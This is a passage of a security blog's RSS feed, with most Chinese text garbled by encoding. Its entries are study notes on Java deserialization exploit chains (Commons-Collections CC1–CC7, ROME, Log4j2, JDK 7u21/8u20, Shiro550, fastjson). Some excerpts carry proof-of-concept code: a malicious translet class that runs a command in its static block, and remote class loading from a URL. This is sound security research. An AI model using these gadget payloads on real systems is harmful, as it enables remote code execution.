1 2 cd vulhub/fastjson/1.2.24-rce docker compose up -d è®¿é—® 8090 ç«¯å£æœåŠ¡ï¼Œå¼€å¯æ¶æ„æœåŠ¡
1 java -jar â€¦</content:encoded></item><item><title>CCé“¾æœ€åä¸€èˆä¹‹CC5å’ŒCC7</title><link>https://baozongwi.xyz/p/cc-chain-last-dance-cc5-cc7/</link><guid>https://baozongwi.xyz/p/cc-chain-last-dance-cc5-cc7/</guid><pubDate>Tue, 14 Oct 2025 20:47:27 +0800</pubDate><description>æœ¬æ¥å½“æ—¶æˆ‘å­¦å®Œé‚£å››æ¡CCé“¾ä¹‹åï¼Œè§‰å¾—æ²¡å¿…è¦å†å­¦äº†ï¼Œå› ä¸ºååå¤å¤å°±æ˜¯é‚£ä¹ˆå‡ ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æ˜¨å¤©å­¦ä¹  ROME ååºåˆ—åŒ–çš„æ—¶å€™å‘ç°æ¶‰åŠäº† CC5 å’Œ CC7 é‡Œé¢çš„å…³é”®æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™è®°å½•ä¸€ä¸‹
å…ˆä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€ï¼Œæ¶æ„ç±»å‡†å¤‡å¥½
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package Base.Unserialize.Base; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Eval extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&amp;amp;#34;open -a Calculator&amp;amp;#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} } CC5 BadAttributeValueExpException#readObjectåˆ°TiedMapEntry#toStringæ¥ç€å°±æ˜¯ LazyMap äº†ï¼Œæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæ–°çš„å…¥å£åŠ  CC6 çš„ååŠæ®µ</description><content:encoded>æœ¬æ¥å½“æ—¶æˆ‘å­¦å®Œé‚£å››æ¡CCé“¾ä¹‹åï¼Œè§‰å¾—æ²¡å¿…è¦å†å­¦äº†ï¼Œå› ä¸ºååå¤å¤å°±æ˜¯é‚£ä¹ˆå‡ ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æ˜¨å¤©å­¦ä¹  ROME ååºåˆ—åŒ–çš„æ—¶å€™å‘ç°æ¶‰åŠäº† CC5 å’Œ CC7 é‡Œé¢çš„å…³é”®æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™è®°å½•ä¸€ä¸‹
å…ˆä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€ï¼Œæ¶æ„ç±»å‡†å¤‡å¥½
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 â€¦</content:encoded></item><item><title>Romeååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/java-rome-deserialization/</link><guid>https://baozongwi.xyz/p/java-rome-deserialization/</guid><pubDate>Mon, 13 Oct 2025 21:55:34 +0800</pubDate><description>éå¸¸é¡ºç•…çš„ä¸€æ¬¡å­¦ä¹ </description><content:encoded>ROMEç®€ä»‹&amp;amp;amp;amp;&amp;amp;amp;amp;ç¯å¢ƒæ­å»º å®˜æ–¹æ–‡æ¡£ï¼šhttps://rometools.github.io/rome/
ROME is a Java framework for RSS and Atom feeds. It&amp;amp;amp;rsquo;s open source and licensed under â€¦</content:encoded></item><item><title>Log4j2ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/log4j2-deserialization-vuln/</link><guid>https://baozongwi.xyz/p/log4j2-deserialization-vuln/</guid><pubDate>Sat, 11 Oct 2025 20:11:27 +0800</pubDate><description>æ ¸å¼¹çº§æ¼æ´æ„Ÿè§‰å…¨æ˜¯å·§åˆ</description><content:encoded>åœ¨Pç‰›çš„å­¦ä¹ æ–‡æ¡£çš„å¸®åŠ©ä¸‹ï¼Œèµ°äº†ä¸€éåŸºç¡€ï¼Œç°åœ¨å‡†å¤‡çœ‹çœ‹å±å®³ï¼ˆå½“æ—¶ï¼‰æé«˜çš„log4jæ¼æ´ï¼Œæˆ‘ä¸€è¿›å»æœç´¢å°±çœ‹åˆ°æœ‰äº›äººè¯´æ˜¯log4jï¼Œåˆæœ‰äº›äººè¯´æ˜¯log4j2ï¼Œè¿·è¿·ç³Šç³Šçš„ï¼ŒæŸ¥äº†ä¸€ä¸‹èµ„æ–™çŸ¥é“ç½‘ä¸Šå¹¿æ³›è®¨è®ºçš„Log4jæ¼æ´ï¼ˆå¦‚CVE-2021-44228ï¼‰å®é™…ä¸Šæ˜¯æŒ‡Log4j2çš„æ¼æ´ ï¼Œè€Œéæ—§çš„Log4j 1.x â€¦</content:encoded></item><item><title>Jdk8u20ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/jdk8u20-deserialization/</link><guid>https://baozongwi.xyz/p/jdk8u20-deserialization/</guid><pubDate>Fri, 10 Oct 2025 23:37:01 +0800</pubDate><description>7u21gadgetçš„ç»•è¿‡</description><content:encoded>https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html å…ˆä¸‹è½½8u20
å›é¡¾å­¦ä¹  å›é¡¾7u21ååºåˆ—åŒ–åˆ©ç”¨é“¾
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 â€¦</content:encoded></item><item><title>Javaååºåˆ—åŒ–åè®®å…¥é—¨</title><link>https://baozongwi.xyz/p/java-deserialization-protocol-intro/</link><guid>https://baozongwi.xyz/p/java-deserialization-protocol-intro/</guid><pubDate>Fri, 10 Oct 2025 19:41:19 +0800</pubDate><description>å®˜æ–¹æ–‡æ¡£å­¦ä¹  é‡Œé¢è®²ç©¶å¤ªå¤šäº†ï¼Œå¯ä»¥çœ‹çœ‹è¿™ä¸ªå®˜æ–¹æ–‡æ¡£
https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html
åˆæ­¥ç†è§£åºåˆ—åŒ–æµçš„è¯­æ³•è§„åˆ™ è¯­æ³•è§„åˆ™å¾ˆé•¿å¾ˆå¤šï¼Œæˆ‘ä»¬å°±çœ‹è¿™å‡ ç‚¹
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 stream: magic version contents contents: content contents content content: object blockdata object: newObject newClass newArray newString newEnum newClassDesc prevObject nullReference exception TC_RESET è¿™æ˜¯ä¸€ä¸ªä¾æ¬¡å±•å¼€çš„å·´ç§‘æ–¯èŒƒå¼ã€‚æˆ‘ä»¬ä»ç¬¬ä¸€ä¸ªstreamå¼€å§‹çœ‹èµ·ï¼Œstreamå°±æ˜¯æŒ‡å®Œæ•´çš„åºåˆ—åŒ–åè®®æµï¼Œ å®ƒæ˜¯æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼šmagicã€versionå’Œcontentsã€‚åœ¨æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å®šä¹‰å¥½çš„å¸¸é‡å€¼</description><content:encoded>å®˜æ–¹æ–‡æ¡£å­¦ä¹  é‡Œé¢è®²ç©¶å¤ªå¤šäº†ï¼Œå¯ä»¥çœ‹çœ‹è¿™ä¸ªå®˜æ–¹æ–‡æ¡£
https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html
åˆæ­¥ç†è§£åºåˆ—åŒ–æµçš„è¯­æ³•è§„åˆ™ è¯­æ³•è§„åˆ™å¾ˆé•¿å¾ˆå¤šï¼Œæˆ‘ä»¬å°±çœ‹è¿™å‡ ç‚¹
1 2 3 4 5 6 7 â€¦</content:encoded></item><item><title>Jdk7u21ååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/jdk7u21-deserialization/</link><guid>https://baozongwi.xyz/p/jdk7u21-deserialization/</guid><pubDate>Thu, 11 Sep 2025 14:50:59 +0800</pubDate><description>å‰é¢å­¦ä¹ äº†CCé“¾ä¹‹åï¼Œæˆ‘ä»¬å‘ç°å…¶å®æ— è®ºä»–å¤šä¹ˆå¤æ‚ï¼Œä¹Ÿå°±æ˜¯ä¸ªreadObjectåˆ°trasformçš„è¿‡ç¨‹ï¼Œè½¬æ¢æˆä¸€ä¸ªå¤§æ€æƒ³ï¼Œå…¶å®å°±æ˜¯è§¦å‘åŠ¨æ€æ‰§è¡Œçš„åœ°æ–¹ï¼Œåˆ°Sinkç‚¹çš„åœ°æ–¹ã€‚
CommonsCollectionsç³»åˆ—ååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹æ˜¯é‚£ä¸€å † Transformer ï¼Œç‰¹åˆ«æ˜¯å…¶ä¸­çš„ InvokerTransformer ã€ InstantiateTransformer CommonsBeanutilsååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹æ˜¯PropertyUtils#getPropertyï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•ä¼šè§¦å‘ä»»æ„å¯¹è±¡çš„getter åœ¨jdk8u71ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰sun.reflect.annotation.AnnotationInvocationHandlerï¼Œå­¦ä¹ CC1çš„æ—¶å€™åˆ©ç”¨è¿™ä¸ªç±» æ—¶Map#putã€ Map#getï¼Œç°åœ¨æ¥çœ‹åˆ°equalsImplæ–¹æ³•
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 private Boolean equalsImpl(Object var1) { if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { for(Method var5 : this.getMemberMethods()) { String var6 = var5.getName(); Object var7 = this.memberValues.get(var6); Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1); if (var9 != null) { var8 = var9.memberValues.get(var6); } else { try { var8 = var5.invoke(var1); } catch (InvocationTargetException var11) { return false; } catch (IllegalAccessException var12) { throw new AssertionError(var12); } } if (!memberValueEquals(var7, var8)) { return false; } } return true; } } é¦–å…ˆå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„åå°„è°ƒç”¨var8 = var5.invoke(var1);ï¼Œä¹Ÿå°±æ˜¯è¯´ä»–åœ¨éå†æ‰€æœ‰this.typeçš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å¯æ§typeä¸ºTemplatesç±»ï¼Œåˆ™åŠ¿å¿…ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„newTransformer()æˆ–getOutputProperties()æ–¹æ³•ï¼Œä»è€ŒRCEã€‚</description><content:encoded>å‰é¢å­¦ä¹ äº†CCé“¾ä¹‹åï¼Œæˆ‘ä»¬å‘ç°å…¶å®æ— è®ºä»–å¤šä¹ˆå¤æ‚ï¼Œä¹Ÿå°±æ˜¯ä¸ªreadObjectåˆ°trasformçš„è¿‡ç¨‹ï¼Œè½¬æ¢æˆä¸€ä¸ªå¤§æ€æƒ³ï¼Œå…¶å®å°±æ˜¯è§¦å‘åŠ¨æ€æ‰§è¡Œçš„åœ°æ–¹ï¼Œåˆ°Sinkç‚¹çš„åœ°æ–¹ã€‚
CommonsCollectionsç³»åˆ—ååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹æ˜¯é‚£ä¸€å † Transformer ï¼Œ â€¦</content:encoded></item><item><title>Shiro550ååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/shiro550-deserialization/</link><guid>https://baozongwi.xyz/p/shiro550-deserialization/</guid><pubDate>Sat, 06 Sep 2025 17:07:54 +0800</pubDate><description>shiro550ä¸­CC6&amp;amp;&amp;amp;CB1&amp;amp;&amp;amp;æ— CCä¾èµ–çš„CB1</description><content:encoded>shiro550 å‰é¢å­¦ä¹ åŠ è½½å­—èŠ‚ç ä¹‹åå­¦ä¹ äº†å‡ æ¡CCé“¾ï¼Œå‘ç°é€šè¿‡TemplatesImplæ„é€ çš„åˆ©ç”¨é“¾ï¼Œç†è®ºä¸Šå¯ä»¥æ‰§è¡Œä»»æ„Javaä»£ç ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸é€šç”¨çš„æ‰‹æ³•ï¼Œä¸å—åˆ°å¯¹äºé“¾çš„é™åˆ¶ï¼Œç‰¹åˆ«æ˜¯æ„é€ å†…å­˜å—ï¼Œæ‰§è¡Œä»»æ„Javaä»£ç çš„éœ€æ±‚å°±æ›´åŠ æµ“çƒˆäº†ã€‚é‚£è¿™ä¸ªæ‰‹æ³•æœ‰å¤šæ½®å‘¢ï¼Ÿæˆ‘ä»¬å°±ä»¥ä¹‹å‰æ‹¿shellæ‹¿åˆ°çˆ½ç°åœ¨ä¹Ÿèƒ½æ¡ â€¦</content:encoded></item><item><title>Javaä¸­ä¸€äº›æœ‰æ„æ€çš„CCé“¾</title><link>https://baozongwi.xyz/p/interesting-cc-chains-in-java/</link><guid>https://baozongwi.xyz/p/interesting-cc-chains-in-java/</guid><pubDate>Tue, 02 Sep 2025 21:33:45 +0800</pubDate><description>CC6&amp;amp;&amp;amp;CC3&amp;amp;&amp;amp;CC2&amp;amp;&amp;amp;CC4</description><content:encoded>æœ¬æ–‡ä¼šè®°å½•ä¸€äº›æœ‰æ„æ€çš„ã€å¿…è¦å­¦ä¹ çš„CCåˆ©ç”¨é“¾ï¼Œä¸è¿‡å¯èƒ½éœ€è¦å‡ å¤©å®Œå·¥ï¼Œæ…¢æ…¢å­¦ç¨³ç¨³å­¦
CC6 Pç‰›ç‰ˆæœ¬ å‰é¢è¯´åˆ°CC1å—åˆ°jdkç‰ˆæœ¬é™åˆ¶çš„åŸå› ï¼Œå…¶å®å°±æ˜¯å› ä¸º sun.reflect.annotation.AnnotationInvocationHandler#readObjectçš„é€»è¾‘å˜åŒ–äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ â€¦</content:encoded></item><item><title>Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç </title><link>https://baozongwi.xyz/p/java-dynamic-bytecode-loading/</link><guid>https://baozongwi.xyz/p/java-dynamic-bytecode-loading/</guid><pubDate>Tue, 02 Sep 2025 21:21:47 +0800</pubDate><description>æœ¬æ–‡ä»‹ç»å‡ ä¸ªåŠ è½½å­—èŠ‚ç çš„å¸¸ç”¨æ–¹æ³•ã€‚æ–¹ä¾¿åç»­å­¦ä¹ CC2ã€fastjsonã€å†…å­˜é©¬ç­‰åº”ç”¨åš
æ¦‚å¿µ ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ï¼ŒJavaå­—èŠ‚ç (ByteCode)å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨ åœ¨.classæ–‡ä»¶ä¸­ã€‚
çŸ¥å‘¨æ‰€ä¼—ï¼Œä¸åŒå¹³å°ã€ä¸åŒCPUçš„è®¡ç®—æœºæŒ‡ä»¤æœ‰å·®å¼‚ï¼Œä½†å› ä¸ºJavaæ˜¯ä¸€é—¨è·¨å¹³å°çš„ç¼–è¯‘å‹è¯­è¨€ï¼Œæ‰€ä»¥è¿™äº›å·®å¼‚å¯¹äºä¸Šå±‚å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ï¼Œä¸Šå±‚å¼€å‘è€…åªéœ€è¦å°†è‡ªå·±çš„ä»£ç ç¼–è¯‘ä¸€æ¬¡ï¼Œå³å¯è¿è¡Œåœ¨ä¸åŒå¹³å°çš„JVMè™šæ‹Ÿæœºä¸­ã€‚
ç”šè‡³ï¼Œå¼€å‘è€…å¯ä»¥ç”¨ç±»ä¼¼Scalaã€Kotlinè¿™æ ·çš„è¯­è¨€ç¼–å†™ä»£ç ï¼Œåªè¦ä½ çš„ç¼–è¯‘å™¨èƒ½å¤Ÿå°†ä»£ç ç¼–è¯‘æˆ.classæ–‡ ä»¶ï¼Œéƒ½å¯ä»¥åœ¨JVMè™šæ‹Ÿæœºä¸­è¿è¡Œï¼ˆè¶…æ¨¡çš„JVMï¼‰:
åŠ è½½ä¹Ÿåˆ†å‡ ç§ï¼Œä¸è¿‡ä¸è®ºæ˜¯åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨:
loadClassçš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»(è¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶)ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡ŒfindClass findClassçš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™defineClass defineClassçš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶ Javaçš„ClassLoaderæ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œå­¦ä¹ åå°„çš„æ—¶å€™å°±æœ‰æ‰€äº†è§£ï¼Œ
ClassLoaderæ˜¯ä»€ä¹ˆå‘¢?å®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚
Javaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚java.lang.Runtimeã€‚
URLClassLoaderå®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„AppClassLoaderçš„çˆ¶ç±»ï¼Œæ‰€ä»¥è§£é‡ŠURLClassLoaderçš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚
æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„(è¿™äº›è·¯å¾„ç»è¿‡å¤„ç†åä¸ºjava.net.URLç±»)æ¥æŸ¥æ‰¾å’ŒåŠ è½½.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µ:
URLæœªä»¥æ–œæ  / ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾ .class æ–‡ä»¶ã€‚ URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ fileï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾ .class æ–‡ä»¶ã€‚ URLä»¥æ–œæ  / ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»ã€‚ ä¸€èˆ¬åœ°ï¼Œæˆ‘ä»¬è¿œç¨‹åŠ è½½è‚¯å®šæ˜¯ç”¨ç¬¬ä¸‰ç§ï¼Œç±»ä¼¼äºRMIæœåŠ¡ï¼Œæµ‹è¯•ä¸€ä¸‹
1 2 3 4 5 6 7 8 package Base.Unserialize.Base; public class Hello { static { System.out.println(&amp;amp;#34;Hello guys!&amp;amp;#34;); } } æ”¾åœ¨æœ¬åœ°8888ç«¯å£ï¼Œå†å†™ä¸€ä¸ªåŠ è½½çš„ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 package Base.Unserialize.Base; import java.net.URL; import java.net.URLClassLoader; public class HelloClassLoader { public static void main( String[] args ) throws Exception { URL[] urls = {new URL(&amp;amp;#34;http://localhost:8888/&amp;amp;#34;)}; URLClassLoader loader = URLClassLoader.newInstance(urls); Class c = loader.loadClass(&amp;amp;#34;Hello&amp;amp;#34;); c.newInstance(); } }</description><content:encoded>æœ¬æ–‡ä»‹ç»å‡ ä¸ªåŠ è½½å­—èŠ‚ç çš„å¸¸ç”¨æ–¹æ³•ã€‚æ–¹ä¾¿åç»­å­¦ä¹ CC2ã€fastjsonã€å†…å­˜é©¬ç­‰åº”ç”¨åš
æ¦‚å¿µ ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ï¼ŒJavaå­—èŠ‚ç (ByteCode)å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨ åœ¨.classæ–‡ä»¶ä¸­ã€‚
çŸ¥å‘¨æ‰€ä¼—ï¼Œä¸åŒå¹³å°ã€ä¸åŒCPUçš„è®¡ç®—æœºæŒ‡ä»¤æœ‰å·®å¼‚ï¼Œä½†å› ä¸ºJavaæ˜¯ä¸€é—¨è·¨ â€¦</content:encoded></item><item><title>Javaååºåˆ—åŒ–ä¹‹CC1</title><link>https://baozongwi.xyz/p/java-deserialization-cc1/</link><guid>https://baozongwi.xyz/p/java-deserialization-cc1/</guid><pubDate>Mon, 01 Sep 2025 23:48:02 +0800</pubDate><description>TransformedMap&amp;amp;&amp;amp;LazyMap</description><content:encoded>å‹æƒ…æé†’ï¼šä¸èƒ½è·Ÿè¿›JDKæ”¹ä¸€ä¸‹è¿™é‡Œ
è¿™é‡Œä¼šé€‰æ‹©ä¸¤ç§CC1æ¥å­¦ä¹ ï¼Œä¸€æ¡æ˜¯ç½‘ä¸Šæ™®éçš„æœ‰åå°„çš„ï¼Œè¿˜æœ‰ä¸€æ¡å°±æ˜¯Pç‰›çš„çº¯å‡€ç‰ˆ
CC1çº¯å‡€ç‰ˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package â€¦</content:encoded></item><item><title>Javaååºåˆ—åŒ–åŸºç¡€</title><link>https://baozongwi.xyz/p/java-deserialization-basics-also-urldns/</link><guid>https://baozongwi.xyz/p/java-deserialization-basics-also-urldns/</guid><pubDate>Fri, 29 Aug 2025 22:31:40 +0800</pubDate><description>ä¸€äº›åŸºç¡€çŸ¥è¯†ä»¥åŠURLDNSé“¾å­¦ä¹ </description><content:encoded>å‰è¨€ ååºåˆ—åŒ–ï¼Œå¯¹äºå­¦ä¹ è¿‡PHPçš„å¸ˆå‚…æ¥è¯´ï¼Œè‚¯å®šä¸é™Œç”Ÿã€‚
åºåˆ—åŒ– ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ç§å¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„æ ¼å¼ï¼ˆä¾‹å¦‚ï¼ŒJSONã€XMLã€äºŒè¿›åˆ¶æµç­‰ï¼‰ï¼Œä»¥ä¾¿äºåç»­çš„å­˜å‚¨æˆ–å‘é€ã€‚å¯¹äºå®ç°å¯¹è±¡çš„æŒä¹…åŒ–ã€ç½‘ç»œä¼ è¾“ç­‰éå¸¸é‡è¦ã€‚ ååºåˆ—åŒ– ï¼šå°†å­˜å‚¨æˆ–ä¼ è¾“çš„æ ¼å¼è¿˜åŸä¸ºåŸæ¥çš„å¯¹è±¡ã€‚è¿™ä¸€è¿‡ç¨‹é€šå¸¸æ˜¯åœ¨æ¥æ”¶ç«¯è¿›è¡Œï¼Œä»¥ä¾¿äºå¯¹ â€¦</content:encoded></item><item><title>JavaRMI</title><link>https://baozongwi.xyz/p/java-rmi/</link><guid>https://baozongwi.xyz/p/java-rmi/</guid><pubDate>Fri, 22 Aug 2025 08:55:59 +0800</pubDate><description>æ¦‚å¿µ Java RMIï¼ˆRemote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸€ä¸ª Java ç¨‹åºè°ƒç”¨è¿è¡Œåœ¨å¦ä¸€å°è®¡ç®—æœºä¸Šçš„ Java å¯¹è±¡çš„æ–¹æ³•ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·ã€‚ç®€å•æ¥è¯´ï¼ŒRMI æŠŠåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å¯¹è±¡äº¤äº’è¿‡ç¨‹â€œé€æ˜åŒ–â€äº†ï¼Œå¼€å‘è€…ä¸éœ€è¦å…³å¿ƒåº•å±‚çš„ç½‘ç»œé€šä¿¡ç»†èŠ‚ï¼Œè€Œæ˜¯é€šè¿‡æ¥å£å’Œæ–¹æ³•è°ƒç”¨æ¥å®ç°è·¨æœºå™¨ã€è·¨ JVM çš„å¯¹è±¡é€šä¿¡ã€‚
å¬èµ·æ¥å°±éå¸¸çš„æ–¹ä¾¿ï¼Œé«˜ç«¯å¤§æ°”ä¸Šæ¡£æ¬¡ã€‚ä½†æ˜¯ï¼Œå…¶ä¸­çš„â€œè·¨ JVM â€æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿ
JVMï¼ˆJava Virtual Machineï¼ŒJava è™šæ‹Ÿæœºï¼‰å°±åƒæ˜¯ Java ç¨‹åºè¿è¡Œçš„ä¸€ä¸ªå®¹å™¨ã€‚è·¨ JVM å°±æ˜¯æŒ‡ï¼Œè°ƒç”¨å‘ç”Ÿåœ¨ä¸åŒçš„ JVM ä¹‹é—´ï¼Œé€šå¸¸è¿è¡Œåœ¨ä¸åŒçš„è¿›ç¨‹ç”šè‡³ä¸åŒçš„æœºå™¨ä¸Šã€‚
å·¦è¾¹æ˜¯ JVM Aï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼Œå®ƒé€šè¿‡ Stubï¼ˆè¿œç¨‹ä»£ç†ï¼‰ å‘èµ·æ–¹æ³•è°ƒç”¨ã€‚ å³è¾¹æ˜¯ JVM Bï¼ˆæœåŠ¡å™¨ç«¯ï¼‰ï¼Œé‡Œé¢æœ‰ Skeletonï¼ˆè¿œç¨‹å¯¹è±¡æ¡©ï¼‰ å’ŒçœŸæ­£çš„ è¿œç¨‹å¯¹è±¡ï¼ˆRemote Objectï¼‰ã€‚ Stub æŠŠå®¢æˆ·ç«¯çš„è°ƒç”¨è¯·æ±‚æ‰“åŒ…ï¼Œé€šè¿‡ç½‘ç»œä¼ è¾“ç»™ Skeletonï¼ŒSkeleton å†è°ƒç”¨çœŸæ­£çš„è¿œç¨‹å¯¹è±¡æ–¹æ³•ï¼Œæœ€åæŠŠç»“æœè¿”å›ã€‚ å…¶æ ¸å¿ƒæ€æƒ³å°±æ˜¯è·¨ JVMã€‚èƒ½å¤Ÿåƒæœ¬åœ°è°ƒç”¨ä¸€æ ·è¿œç¨‹è°ƒç”¨æ–¹æ³•ï¼Œä½¿åˆ†å¸ƒå¼å¯¹è±¡ä¹‹é—´çš„äº¤äº’å˜å¾—é€æ˜ã€ä¾¿æ·ã€‚
å®ç° ä»å®‰å…¨çš„è§’åº¦æ¥è®²ï¼ŒRMIçš„åŸºç¡€ç»„ä»¶ä¸»è¦åˆ†ä¸ºå››ç§
